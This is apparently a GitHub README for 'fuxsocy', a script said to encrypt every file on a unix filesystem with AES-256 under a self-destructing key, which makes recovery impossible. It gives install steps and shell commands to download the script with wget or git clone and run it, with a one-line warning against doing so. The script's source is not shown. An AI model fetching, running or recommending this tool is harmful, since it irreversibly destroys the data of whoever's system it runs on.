# fuxsocy

__WARNING: do not actually execute this. You will not be able to recover the files.__

- This is intended to encrypt every bit of data in a unix filesystem using 256-bit AES with 
a __self-destructing__, randomly generated key.

### Prerequisites:

* python
* pycrypto

```shell
sudo apt install python python-pip
```
```shell
sudo pip install pycrypto
```

### Usage:

```shell
wget https://raw.githubusercontent.com/D34thByte/fuxsocy/master/fuxsocy.py
```

```shell
sudo chmod +x fuxsocy.py
```
```shell
./fuxsocy.py
```

or

```shell
git clone https://github.com/D34thByte/fuxsocy.git
```

```shell
cd /fuxsocy && python fuxsocy.py
```